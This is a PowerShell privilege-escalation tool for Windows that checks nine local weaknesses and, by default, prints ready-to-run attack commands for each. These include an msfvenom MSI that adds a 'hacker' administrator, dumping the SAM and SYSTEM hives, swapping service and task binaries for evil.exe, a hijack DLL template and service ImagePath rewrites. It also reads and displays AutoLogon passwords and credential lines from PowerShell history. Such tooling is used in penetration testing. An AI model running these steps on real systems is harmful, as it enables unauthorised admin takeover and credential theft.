# AutoPrivEsc.ps1
# Windows Privilege Escalation Scanner
# Usage:
#   powershell -ExecutionPolicy Bypass -File .\AutoPrivEsc.ps1
#   powershell -ExecutionPolicy Bypass -File .\AutoPrivEsc.ps1 -ScanOnly
#   powershell -ExecutionPolicy Bypass -File .\AutoPrivEsc.ps1 -Report

param(
    [switch]$ScanOnly,
    [switch]$Report
)

# ─────────────────────────────────────────────
# Output Helpers
# ─────────────────────────────────────────────

function Write-Found   { param($msg) Write-Host "  [FOUND] $msg"   -ForegroundColor Yellow }
function Write-Exploit { param($msg) Write-Host "  [EXPLOIT] $msg" -ForegroundColor Green  }
function Write-Info    { param($msg) Write-Host "  [*] $msg"       -ForegroundColor Cyan   }
function Write-Skip    { param($msg) Write-Host "  [-] $msg"       -ForegroundColor Gray   }

function Write-Section {
    param($msg)
    Write-Host ""
    Write-Host ("=" * 55) -ForegroundColor Cyan
    Write-Host "  $msg"   -ForegroundColor White
    Write-Host ("=" * 55) -ForegroundColor Cyan
}

# ─────────────────────────────────────────────
# Results Tracker
# ─────────────────────────────────────────────

$global:Found     = [System.Collections.ArrayList]@()
$global:Exploited = [System.Collections.ArrayList]@()
$global:Failed    = [System.Collections.ArrayList]@()

function Log-Found   { param($v, $d) [void]$global:Found.Add("[$v] $d")     }
function Log-Exploit { param($v, $c) [void]$global:Exploited.Add("[$v] $c") }
function Log-Failed  { param($v, $r) [void]$global:Failed.Add("[$v] $r")    }

# ─────────────────────────────────────────────
# System Info
# ─────────────────────────────────────────────

function Get-SysInfo {
    Write-Section "SYSTEM INFORMATION"

    $os      = (Get-WmiObject Win32_OperatingSystem).Caption
    $version = (Get-WmiObject Win32_OperatingSystem).Version
    $arch    = $env:PROCESSOR_ARCHITECTURE
    $hostname = $env:COMPUTERNAME
    $user    = "$env:USERDOMAIN\$env:USERNAME"
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

    Write-Host ""
    Write-Host "  Hostname : $hostname"
    Write-Host "  User     : $user"
    Write-Host "  OS       : $os"
    Write-Host "  Version  : $version"
    Write-Host "  Arch     : $arch"

    if ($isAdmin) {
        Write-Host "  Is Admin : YES" -ForegroundColor Green
        Write-Host ""
        Write-Host "  Already running as Administrator!" -ForegroundColor Green
        exit 0
    } else {
        Write-Host "  Is Admin : NO" -ForegroundColor Red
    }

    Write-Host ""
    Write-Info "Current token privileges:"
    whoami /priv 2>$null
}

# ─────────────────────────────────────────────
# Vector 1 - Token Privileges
# ─────────────────────────────────────────────

function Check-TokenPrivileges {
    param([bool]$Exploit)
    Write-Section "VECTOR 1 - Token Privileges"

    $privs = (whoami /priv 2>$null) -join "`n"

    $privList = @(
        "SeImpersonatePrivilege",
        "SeAssignPrimaryTokenPrivilege",
        "SeDebugPrivilege",
        "SeBackupPrivilege",
        "SeRestorePrivilege",
        "SeTakeOwnershipPrivilege",
        "SeLoadDriverPrivilege"
    )

    $found = $false
    foreach ($priv in $privList) {
        if ($privs -match $priv) {
            Write-Found "$priv is present"
            Log-Found "TOKEN" $priv
            $found = $true

            if ($Exploit) {
                if ($priv -eq "SeImpersonatePrivilege" -or $priv -eq "SeAssignPrimaryTokenPrivilege") {
                    Write-Host ""
                    Write-Host "  Download PrintSpoofer:" -ForegroundColor Yellow
                    Write-Host "  https://github.com/itm4n/PrintSpoofer/releases" -ForegroundColor Yellow
                    Write-Host "  Run: PrintSpoofer.exe -i -c cmd.exe" -ForegroundColor Yellow
                    Write-Host ""
                    Write-Host "  Or GodPotato:" -ForegroundColor Yellow
                    Write-Host "  https://github.com/BeichenDream/GodPotato/releases" -ForegroundColor Yellow
                    Write-Host "  Run: GodPotato.exe -cmd cmd" -ForegroundColor Yellow
                    Log-Exploit "TOKEN" "PrintSpoofer.exe -i -c cmd.exe"
                }
                elseif ($priv -eq "SeBackupPrivilege") {
                    Write-Host "  Run: reg save HKLM\SAM C:\Temp\SAM" -ForegroundColor Yellow
                    Write-Host "  Run: reg save HKLM\SYSTEM C:\Temp\SYSTEM" -ForegroundColor Yellow
                    Log-Exploit "SeBackupPrivilege" "reg save HKLM\SAM and SYSTEM hives"
                }
                else {
                    Write-Host "  Manual exploitation needed for $priv" -ForegroundColor Yellow
                }
            }
        }
    }

    if (-not $found) {
        Write-Skip "No dangerous token privileges found."
    }
}

# ─────────────────────────────────────────────
# Vector 2 - AlwaysInstallElevated
# ─────────────────────────────────────────────

function Check-AlwaysInstallElevated {
    param([bool]$Exploit)
    Write-Section "VECTOR 2 - AlwaysInstallElevated"
    Write-Info "Checking registry keys..."

    $hklm = $null
    $hkcu = $null

    try {
        $hklm = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -EA SilentlyContinue).AlwaysInstallElevated
    } catch {}

    try {
        $hkcu = (Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -EA SilentlyContinue).AlwaysInstallElevated
    } catch {}

    if ($hklm -eq 1 -and $hkcu -eq 1) {
        Write-Found "AlwaysInstallElevated is ENABLED in both HKLM and HKCU"
        Log-Found "ALWAYS_INSTALL_ELEVATED" "Both keys set to 1"

        if ($Exploit) {
            Write-Host ""
            Write-Host "  Generate malicious MSI:" -ForegroundColor Yellow
            Write-Host "  msfvenom -p windows/adduser USER=hacker PASS=Hacker123! -f msi -o evil.msi" -ForegroundColor Yellow
            Write-Host "  Install: msiexec /quiet /qn /i evil.msi" -ForegroundColor Yellow
            Log-Exploit "ALWAYS_INSTALL_ELEVATED" "msiexec /quiet /qn /i evil.msi"
        }
    } else {
        Write-Skip "AlwaysInstallElevated not enabled."
    }
}

# ─────────────────────────────────────────────
# Vector 3 - Unquoted Service Paths
# ─────────────────────────────────────────────

function Check-UnquotedServicePaths {
    param([bool]$Exploit)
    Write-Section "VECTOR 3 - Unquoted Service Paths"
    Write-Info "Scanning services for unquoted paths with spaces..."

    $services = Get-WmiObject Win32_Service | Where-Object {
        $_.PathName -and
        $_.PathName -notmatch '^"' -and
        $_.PathName -match " " -and
        $_.PathName -notmatch "^C:\\Windows\\"
    }

    if (-not $services) {
        Write-Skip "No unquoted service paths found."
        return
    }

    foreach ($svc in $services) {
        $path = $svc.PathName
        Write-Found "Service: $($svc.Name)"
        Write-Host "         Path: $path" -ForegroundColor Gray
        Log-Found "UNQUOTED_SERVICE" "$($svc.Name)"

        if ($Exploit) {
            $parts = $path.Split("\")
            $built = ""
            foreach ($part in $parts) {
                if ($built -ne "") {
                    $built = $built + "\" + $part
                } else {
                    $built = $part
                }
                if ($part -match " ") {
                    $inject = ($built.Split(" "))[0] + ".exe"
                    $dir    = Split-Path $inject -Parent
                    if (Test-Path $dir -EA SilentlyContinue) {
                        try {
                            $testFile = Join-Path $dir "test_$([guid]::NewGuid()).tmp"
                            [IO.File]::WriteAllText($testFile, "test")
                            Remove-Item $testFile -EA SilentlyContinue
                            Write-Exploit "Writable injection point: $inject"
                            Write-Host "  copy evil.exe `"$inject`"" -ForegroundColor Yellow
                            Write-Host "  sc stop $($svc.Name)" -ForegroundColor Yellow
                            Write-Host "  sc start $($svc.Name)" -ForegroundColor Yellow
                            Log-Exploit "UNQUOTED_SERVICE" "copy evil.exe to $inject"
                        } catch {}
                    }
                    break
                }
            }
        }
    }
}

# ─────────────────────────────────────────────
# Vector 4 - Weak Service Permissions
# ─────────────────────────────────────────────

function Check-WeakServicePermissions {
    param([bool]$Exploit)
    Write-Section "VECTOR 4 - Weak Service Binary Permissions"
    Write-Info "Checking if service binaries are writable..."

    $services = Get-WmiObject Win32_Service | Where-Object { $_.PathName }
    $found    = $false

    foreach ($svc in $services) {
        $raw = $svc.PathName
        $exe = $raw -replace '^"([^"]+)".*', '$1'
        $exe = $exe.Trim()
        if ($exe -notmatch '\.exe$') { continue }
        if (-not (Test-Path $exe -EA SilentlyContinue)) { continue }

        try {
            $testFile = $exe + ".writetest"
            [IO.File]::WriteAllText($testFile, "test")
            Remove-Item $testFile -EA SilentlyContinue

            Write-Found "Writable service binary: $exe"
            Log-Found "WEAK_SERVICE_BINARY" $exe
            $found = $true

            if ($Exploit) {
                Write-Host "  copy evil.exe `"$exe`"" -ForegroundColor Yellow
                Write-Host "  sc start $($svc.Name)" -ForegroundColor Yellow
                Log-Exploit "WEAK_SERVICE_BINARY" "copy evil.exe to $exe"
            }
        } catch {}
    }

    if (-not $found) {
        Write-Skip "No writable service binaries found."
    }
}

# ─────────────────────────────────────────────
# Vector 5 - Stored Credentials
# ─────────────────────────────────────────────

function Check-StoredCredentials {
    param([bool]$Exploit)
    Write-Section "VECTOR 5 - Stored Credentials"

    Write-Info "Checking Windows Credential Manager..."
    $cmdkey = cmdkey /list 2>$null
    $cmdkeyStr = $cmdkey -join "`n"
    if ($cmdkeyStr -match "Target:") {
        Write-Found "Stored credentials in Credential Manager"
        Write-Host $cmdkeyStr -ForegroundColor Gray
        Log-Found "CMDKEY_CREDS" "credentials found"

        if ($Exploit) {
            Write-Host '  runas /savecred /user:DOMAIN\Administrator cmd.exe' -ForegroundColor Yellow
            Log-Exploit "CMDKEY_CREDS" "runas /savecred"
        }
    } else {
        Write-Skip "No credentials in Credential Manager."
    }

    Write-Info "Checking AutoLogon registry..."
    try {
        $winlogon = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
        $defPass = (Get-ItemProperty $winlogon -Name DefaultPassword -EA SilentlyContinue).DefaultPassword
        $defUser = (Get-ItemProperty $winlogon -Name DefaultUserName -EA SilentlyContinue).DefaultUserName
        if ($defPass) {
            Write-Found "AutoLogon credentials found"
            Write-Host "  User : $defUser" -ForegroundColor Yellow
            Write-Host "  Pass : $defPass" -ForegroundColor Yellow
            Log-Found "AUTOLOGON" "User=$defUser"
        } else {
            Write-Skip "No AutoLogon credentials."
        }
    } catch {
        Write-Skip "Could not read AutoLogon registry."
    }

    Write-Info "Searching for unattended install files..."
    $unattendPaths = @(
        "C:\Windows\Panther\Unattend.xml",
        "C:\Windows\Panther\Unattended.xml",
        "C:\Windows\System32\sysprep\sysprep.xml",
        "C:\unattend.xml",
        "C:\autounattend.xml"
    )
    foreach ($p in $unattendPaths) {
        if (Test-Path $p) {
            Write-Found "Unattended install file: $p"
            Log-Found "UNATTEND_FILE" $p
        }
    }

    Write-Info "Checking PowerShell history..."
    $histPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (Test-Path $histPath) {
        $hist = Get-Content $histPath -EA SilentlyContinue
        $credLines = $hist | Where-Object { $_ -match "password|passwd|cred|secret" }
        if ($credLines) {
            Write-Found "Credential-related commands in PowerShell history"
            $credLines | ForEach-Object { Write-Host "  $_" -ForegroundColor Yellow }
            Log-Found "PS_HISTORY" "credential lines found"
        } else {
            Write-Skip "Nothing interesting in PowerShell history."
        }
    } else {
        Write-Skip "No PowerShell history file found."
    }
}

# ─────────────────────────────────────────────
# Vector 6 - AutoRun Registry Keys
# ─────────────────────────────────────────────

function Check-AutoRun {
    param([bool]$Exploit)
    Write-Section "VECTOR 6 - AutoRun Registry Keys"
    Write-Info "Checking Run/RunOnce keys for writable binaries..."

    $runKeys = @(
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
    )

    $found = $false

    foreach ($key in $runKeys) {
        if (-not (Test-Path $key)) { continue }

        try {
            $values = Get-ItemProperty $key -EA SilentlyContinue
            $values.PSObject.Properties | Where-Object { $_.Name -notmatch "^PS" } | ForEach-Object {
                $val = $_.Value
                $exe = $val -replace '^"([^"]+)".*', '$1'
                $exe = $exe.Trim()

                Write-Info "$($_.Name) = $val"

                if (Test-Path $exe -EA SilentlyContinue) {
                    try {
                        $testFile = $exe + ".writetest"
                        [IO.File]::WriteAllText($testFile, "test")
                        Remove-Item $testFile -EA SilentlyContinue
                        Write-Found "Writable AutoRun binary: $exe"
                        Log-Found "AUTORUN" $exe
                        $found = $true
                        if ($Exploit) {
                            Write-Host "  copy evil.exe `"$exe`"" -ForegroundColor Yellow
                            Write-Host "  Payload runs on next login" -ForegroundColor Yellow
                            Log-Exploit "AUTORUN" "copy evil.exe to $exe"
                        }
                    } catch {}
                }
            }
        } catch {}
    }

    if (-not $found) {
        Write-Skip "No writable AutoRun binaries found."
    }
}

# ─────────────────────────────────────────────
# Vector 7 - Scheduled Tasks
# ─────────────────────────────────────────────

function Check-ScheduledTasks {
    param([bool]$Exploit)
    Write-Section "VECTOR 7 - Scheduled Tasks"
    Write-Info "Looking for SYSTEM tasks with writable binaries..."

    $found = $false

    try {
        $tasks = Get-ScheduledTask -EA SilentlyContinue | Where-Object {
            $_.Principal.UserId -match "SYSTEM|Administrator"
        }

        foreach ($task in $tasks) {
            $action = $task.Actions | Select-Object -First 1
            if (-not $action) { continue }
            $exe = $action.Execute
            if (-not $exe) { continue }
            if (-not (Test-Path $exe -EA SilentlyContinue)) { continue }

            try {
                $testFile = $exe + ".writetest"
                [IO.File]::WriteAllText($testFile, "test")
                Remove-Item $testFile -EA SilentlyContinue
                Write-Found "Writable SYSTEM task binary: $exe"
                Write-Host "  Task: $($task.TaskName)" -ForegroundColor Gray
                Log-Found "SCHED_TASK" "$($task.TaskName)"
                $found = $true
                if ($Exploit) {
                    Write-Host "  1. copy evil.exe `"$exe`"" -ForegroundColor Yellow
                    Write-Host "  2. Start-ScheduledTask -TaskName $($task.TaskName)" -ForegroundColor Yellow
                    Log-Exploit "SCHED_TASK" "copy evil.exe to $exe"
                }
            } catch {}
        }
    } catch {
        Write-Skip "Could not enumerate scheduled tasks."
    }

    if (-not $found) {
        Write-Skip "No exploitable scheduled tasks found."
    }
}

# ─────────────────────────────────────────────
# Vector 8 - DLL Hijacking
# ─────────────────────────────────────────────

function Check-DLLHijacking {
    param([bool]$Exploit)
    Write-Section "VECTOR 8 - DLL Hijacking"
    Write-Info "Checking PATH for writable non-system directories..."

    $pathDirs = $env:PATH -split ";"
    $found    = $false

    foreach ($dir in $pathDirs) {
        if (-not $dir) { continue }
        if (-not (Test-Path $dir -EA SilentlyContinue)) { continue }
        if ($dir -match "System32|SysWOW64|Windows") { continue }

        try {
            $testFile = Join-Path $dir "test_$([guid]::NewGuid()).tmp"
            [IO.File]::WriteAllText($testFile, "test")
            Remove-Item $testFile -EA SilentlyContinue
            Write-Found "Writable PATH directory: $dir"
            Log-Found "DLL_HIJACK" $dir
            $found = $true

            if ($Exploit) {
                Write-Host "  Plant a malicious DLL in: $dir" -ForegroundColor Yellow
                Write-Host "  DLL template (C++):" -ForegroundColor Yellow
                Write-Host "  #include <windows.h>" -ForegroundColor Gray
                Write-Host "  BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID lp) {" -ForegroundColor Gray
                Write-Host "      if (r == DLL_PROCESS_ATTACH)" -ForegroundColor Gray
                Write-Host "          system(`"net localgroup administrators hacker /add`");" -ForegroundColor Gray
                Write-Host "      return TRUE; }" -ForegroundColor Gray
                Log-Exploit "DLL_HIJACK" "Plant malicious DLL in $dir"
            }
        } catch {}
    }

    if (-not $found) {
        Write-Skip "No writable non-system PATH directories found."
    }
}

# ─────────────────────────────────────────────
# Vector 9 - Weak Registry Permissions
# ─────────────────────────────────────────────

function Check-WeakRegistryPermissions {
    param([bool]$Exploit)
    Write-Section "VECTOR 9 - Weak Registry Permissions on Services"
    Write-Info "Checking if service registry keys are writable..."

    $found = $false

    try {
        $svcs = Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services" -EA SilentlyContinue
        foreach ($svc in $svcs) {
            try {
                $acl = Get-Acl $svc.PSPath -EA SilentlyContinue
                $writable = $acl.Access | Where-Object {
                    $_.RegistryRights -match "WriteKey|FullControl|SetValue" -and
                    $_.IdentityReference -match "Everyone|Users|Authenticated"
                }
                if ($writable) {
                    Write-Found "Writable registry key: $($svc.Name)"
                    Log-Found "WEAK_REGISTRY" $svc.Name
                    $found = $true
                    if ($Exploit) {
                        Write-Host "  Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\$($svc.Name) -Name ImagePath -Value C:\Temp\evil.exe" -ForegroundColor Yellow
                        Write-Host "  sc start $($svc.Name)" -ForegroundColor Yellow
                        Log-Exploit "WEAK_REGISTRY" "Modify ImagePath of $($svc.Name)"
                    }
                }
            } catch {}
        }
    } catch {
        Write-Skip "Could not check registry permissions."
    }

    if (-not $found) {
        Write-Skip "No writable service registry keys found."
    }
}

# ─────────────────────────────────────────────
# Final Report
# ─────────────────────────────────────────────

function Print-Report {
    param([bool]$SaveReport)
    Write-Section "FINAL REPORT"

    $user    = "$env:USERDOMAIN\$env:USERNAME"
    $dateStr = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

    Write-Host ""
    Write-Host "  User      : $user"
    Write-Host "  Scan time : $dateStr"
    Write-Host ""
    Write-Host "  Vectors found   : $($global:Found.Count)"     -ForegroundColor Yellow
    Write-Host "  Exploits ready  : $($global:Exploited.Count)" -ForegroundColor Green
    Write-Host "  Failed          : $($global:Failed.Count)"    -ForegroundColor Red

    if ($global:Exploited.Count -gt 0) {
        Write-Host ""
        Write-Host "  EXPLOIT COMMANDS TO RUN:" -ForegroundColor Green
        foreach ($item in $global:Exploited) {
            Write-Host ""
            Write-Host "    $item" -ForegroundColor Yellow
        }
    }

    if ($global:Found.Count -eq 0) {
        Write-Host ""
        Write-Host "  No obvious vectors found." -ForegroundColor Red
        Write-Host "  Consider: kernel exploits, Kerberoasting, AS-REP Roasting, GPP passwords."
    }

    if ($SaveReport) {
        $reportPath = "$env:TEMP\privesc_report_$(Get-Date -Format yyyyMMdd_HHmmss).txt"
        $lines = @()
        $lines += "AutoPrivEsc Report"
        $lines += "User: $user"
        $lines += "Date: $dateStr"
        $lines += "=" * 50
        $lines += ""
        $lines += "FOUND:"
        foreach ($item in $global:Found)     { $lines += "  $item" }
        $lines += ""
        $lines += "EXPLOITED:"
        foreach ($item in $global:Exploited) { $lines += "  $item" }
        $lines | Out-File $reportPath -Encoding UTF8
        Write-Host ""
        Write-Host "  Report saved to: $reportPath" -ForegroundColor Green
    }
}

# ─────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────

$exploit = -not $ScanOnly
$modeStr = if ($ScanOnly) { "SCAN ONLY" } else { "SCAN + EXPLOIT" }
$dateStr = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

Write-Host ""
Write-Host ("=" * 55) -ForegroundColor Cyan
Write-Host "  AutoPrivEsc - Windows PrivEsc (PowerShell)" -ForegroundColor White
Write-Host ("=" * 55) -ForegroundColor Cyan
Write-Host "  User : $env:USERDOMAIN\$env:USERNAME"
Write-Host "  Mode : $modeStr"
Write-Host "  Time : $dateStr"
Write-Host ("=" * 55) -ForegroundColor Cyan

Get-SysInfo
Check-TokenPrivileges          -Exploit $exploit
Check-AlwaysInstallElevated    -Exploit $exploit
Check-UnquotedServicePaths     -Exploit $exploit
Check-WeakServicePermissions   -Exploit $exploit
Check-StoredCredentials        -Exploit $exploit
Check-AutoRun                  -Exploit $exploit
Check-ScheduledTasks           -Exploit $exploit
Check-DLLHijacking             -Exploit $exploit
Check-WeakRegistryPermissions  -Exploit $exploit

Print-Report -SaveReport $Report
